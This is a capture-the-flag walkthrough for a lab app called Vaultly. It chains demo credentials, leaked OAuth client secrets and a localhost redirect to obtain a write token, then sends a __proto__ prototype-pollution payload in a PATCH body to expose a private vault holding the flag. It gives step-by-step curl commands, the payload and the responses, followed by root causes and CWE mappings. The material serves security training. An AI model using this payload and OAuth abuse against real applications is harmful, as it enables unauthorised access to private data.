# vaultly-004 - BugForge Lab Walkthrough

**URL:** https://lab-*.labs-app.bugforge.io/ (ephemeral)
**Difficulty:** Medium  
**Vulnerability:** Prototype Pollution → Published Data Room Projection Bypass → Credential/Flag Disclosure
**Flag:** `bug{0lv9enPpDYQyPo10s7dwbEQD7Iz5rFQN}`

---

## Summary

Vaultly is a document vault SaaS. The login page exposes demo credentials for a pre-seeded organization. The organization has a connected OAuth2 app ("Acme Analytics") with a localhost redirect URI pointing to the Vaultly server's own `/oauth/callback-demo` page, which leaks client credentials. An attacker with admin demo access can register an OAuth2 app within the org, approve it, and capture the auth code from the `Location` header to obtain a `files:write` Bearer token. Sending `__proto__` inside the PATCH metadata body pollutes the JavaScript Object prototype used by the published data room handler - causing ALL vaults (including private ones) to expose their `content` field. A hidden "Operations" vault (vault 8) contains `break-glass.txt` with the flag.

## Tech Stack

- Next.js (App Router, SSR)
- Node.js backend
- OAuth2 authorization server (custom)
- Published data rooms with configurable projection

## Key Endpoints

| Endpoint | Auth | Description |
|---|---|---|
| `/login` | none | Shows demo accounts on page |
| `/settings/apps` | session | Connected OAuth2 apps with client credentials |
| `/oauth/callback-demo` | none | Demo OAuth callback page - leaks client credentials |
| `/api/oauth/authorize` | session | OAuth2 approval endpoint |
| `/api/oauth/token` | none | Token exchange |
| `/api/v1/files` | Bearer | List files in caller's org |
| `PATCH /api/v1/files/:id` | Bearer `files:write` | Update file metadata (merge-patch) |
| `GET /api/v1/published` | none | List published data rooms |
| `GET /api/v1/published/:fileId` | none | Read published file with projection |

## Attack Chain

### Step 1: Demo credentials on login page

```bash
curl -s https://TARGET/login | grep -A5 "Demo accounts"
# Reveals: owner@acme.test, admin@acme.test, editor@acme.test, viewer@acme.test / password: vaultly
```

### Step 2: Login as admin and read connected apps

```bash
curl -s -D - -X POST https://TARGET/api/auth/login \
  -d "email=admin%40acme.test&password=vaultly"
# Save vaultly_session cookie

curl -s https://TARGET/settings/apps -H "Cookie: <admin_cookie>"
# Reveals Acme Analytics:
#   client_id: vc_60be4c431ee18fce
#   client_secret: vs_GiL9QuyQOH0eCNM1cOlfg7h1
#   redirect_uri: http://localhost:3000/oauth/callback-demo
```

### Step 3: Read public-api.md (the "docs") from admin's Product vault

```bash
curl -s https://TARGET/api/files/12 -H "Cookie: <admin_cookie>"
# Reveals: PATCH /api/v1/files/:id (merge-patch metadata)
# And: published data rooms with 'content' as available projection field
```

### Step 4: OAuth token theft via localhost redirect

Register a new app within Acme Corp with `files:write` scope and localhost redirect:

```bash
# Register app as admin (same org = allowed)
curl -s -X POST https://TARGET/api/apps -H "Cookie: <admin_cookie>" \
  -d "_action=create&name=LocalDemoApp&redirect_uris=http%3A%2F%2Flocalhost%3A3000%2Foauth%2Fcallback-demo&scopes=profile&scopes=files%3Aread&scopes=files%3Awrite"

# Get client_id and client_secret from /settings/apps
# (They appear on the page since this is your org's own app)

# Approve the app as admin - auth code lands at localhost:3000 (= Vaultly server)
curl -sv -X POST https://TARGET/api/oauth/authorize \
  -H "Cookie: <admin_cookie>" \
  --data-urlencode "client_id=vc_<LOCAL_APP_ID>" \
  --data-urlencode "redirect_uri=http://localhost:3000/oauth/callback-demo" \
  --data-urlencode "scope=files:read files:write" \
  --data-urlencode "decision=approve"
# Location header: http://localhost:3000/oauth/callback-demo?code=<AUTH_CODE>
# NOTE: http://localhost:3000 = the Vaultly server itself
# The code is in the Location header - capture it

# Exchange code for token
curl -s -X POST https://TARGET/api/oauth/token \
  --data-urlencode "grant_type=authorization_code" \
  --data-urlencode "code=<AUTH_CODE>" \
  --data-urlencode "redirect_uri=http://localhost:3000/oauth/callback-demo" \
  --data-urlencode "client_id=vc_<LOCAL_APP_ID>" \
  --data-urlencode "client_secret=vs_<LOCAL_APP_SECRET>"
# Returns: {"access_token":"vot_...","scope":"files:read files:write"}
```

Alternatively, the `/oauth/callback-demo` page itself leaks the Acme Analytics client credentials when visited with a code param - those can be used without registering a new app.

### Step 5: Prototype pollution via PATCH metadata

```bash
curl -s -X PATCH https://TARGET/api/v1/files/26 \
  -H "Authorization: Bearer vot_<WRITE_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"metadata":{"__proto__":{"fields":["id","name","mime","size","content"]}}}'
```

This pollutes the JS Object prototype used by the published rooms handler, injecting `fields: ["id","name","mime","size","content"]` as a default on all vault objects that don't have their own `fields` property.

### Step 6: Read all published rooms - hidden vault and flag appear

```bash
curl -s https://TARGET/api/v1/published
# Now returns ALL vaults with content in projection, including:
# Vault 8 "Operations" (previously private) → file 28 "break-glass.txt"

curl -s https://TARGET/api/v1/published/28
# Returns:
# {"file":{"id":28,"name":"break-glass.txt","mime":"text/plain","size":116,
#   "content":"VAULTLY HQ - BREAK-GLASS RECOVERY\n\nMaster recovery key (do not distribute):\nbug{0lv9enPpDYQyPo10s7dwbEQD7Iz5rFQN}\n"}}
```

## Discovery Notes

- Login page shows demo credentials for pre-seeded org accounts
- `/settings/apps` shows three connected OAuth apps; Acme Analytics has `redirect_uri: http://localhost:3000/oauth/callback-demo`
- `/oauth/callback-demo` is publicly accessible and displays client credentials in the curl example on the page
- `public-api.md` (file 12 in admin's Product vault) describes `PATCH /api/v1/files/:id` and the `content` field in published projections
- Prototype pollution via `__proto__` in PATCH metadata body affects the published rooms response builder
- Vault 8 "Operations" has no explicit `publicProjection` so it inherits the polluted default `fields` and becomes visible with content

## Dead Ends

| What was tried | Why it failed | Lesson |
|---|---|---|
| Changing vault's stored `publicProjection` via form | No vault update endpoint exists | Vault projection is set at creation only |
| Setting `publicProjection` in file metadata | Server only stores it as metadata, doesn't read it for projection | Metadata and projection are separate |
| IDOR on PATCH (attacker token on admin files) | Server scopes to caller's org | Org scoping on file endpoints is correct |
| `?fields=content` query param on published endpoint | Server ignores query-param projection overrides | Projection is vault-stored only |
| Mass assignment via root-level body fields | Server requires `metadata` key and ignores other root fields | Body shape validation works |
| Setting `__proto__` in metadata (wrong key name) | Needed `fields` key specifically (not `publicProjection`) | The runtime key name matters |

## Root Causes

- **Prototype pollution**: PATCH endpoint stores arbitrary JSON into metadata without sanitizing keys - allowing `__proto__` to pollute the Object prototype used by the published rooms response builder
- **Hidden vault**: Operations vault (vault 8) was never explicitly published but was exposed when prototype pollution injected a default `fields` projection
- **Credential exposure**: OAuth2 client credentials visible to all org members on the connected apps page + on the public `/oauth/callback-demo` demo page
- **Localhost redirect URI**: Acme Analytics OAuth app configured with `http://localhost:3000/oauth/callback-demo` - since this resolves to the Vaultly server itself, auth codes are capturable from the Location header

## CWE / OWASP

- CWE-1321: Prototype Pollution
- CWE-522: Insufficiently Protected Credentials (client credentials on demo callback page)
- CWE-346: Origin Validation Error (OAuth redirect URI to self)
- OWASP A01: Broken Access Control (hidden vault exposed via prototype pollution)
- OWASP A06: Vulnerable and Outdated Components (accepting `__proto__` in JSON)
